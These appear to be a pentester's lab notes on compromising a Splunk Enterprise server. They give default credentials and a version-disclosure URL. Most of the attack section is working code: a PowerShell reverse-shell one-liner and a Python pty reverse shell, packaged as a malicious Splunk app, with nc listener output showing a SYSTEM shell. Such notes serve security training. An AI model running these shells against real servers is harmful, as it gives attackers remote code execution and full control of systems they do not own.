### Enumberation

The Splunk Enterprise trial converts to a free version after 60 days, which doesn’t require authentication.

Older systems use the default creds as `admin:changeme`

Navigating to the following URL can give us the version number of Splunk: `https://10.129.201.50:8000/en-GB/manager/launcher/apps/local`

![[Pasted image 20250202153350.png]]

### Attack

Using the following, we can get a reverse shell:

```bash
git clone https://github.com/0xjpuff/reverse_shell_splunk.git
```
#### Windows

Update run.ps1 with the IP and port details:

```bash
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('<Your_IP>',<Your_Port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

And then tar the file

```bash
tar -cvzf updater.tar.gz reverse_shell_splunk/
reverse_shell_splunk/
reverse_shell_splunk/default/
reverse_shell_splunk/default/inputs.conf
reverse_shell_splunk/bin/
reverse_shell_splunk/bin/run.bat
reverse_shell_splunk/bin/rev.py
reverse_shell_splunk/bin/run.ps1
```

![[Pasted image 20250202154437.png]]

Select the .tar.gz file and immediately and reverse shell should be obtained:

```bash
sudo nc -lvp 4443        
Listening on 0.0.0.0 4443
Connection received on 10.129.201.50 50992
  
PS C:\Windows\system32> whoami
nt authority\system
```

#### Linux

Pretty much the same process as windows, but update the rev.py instead:

```python
import sys,socket,os,pty

ip="<Your_IP>"
port="<Your_Port"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

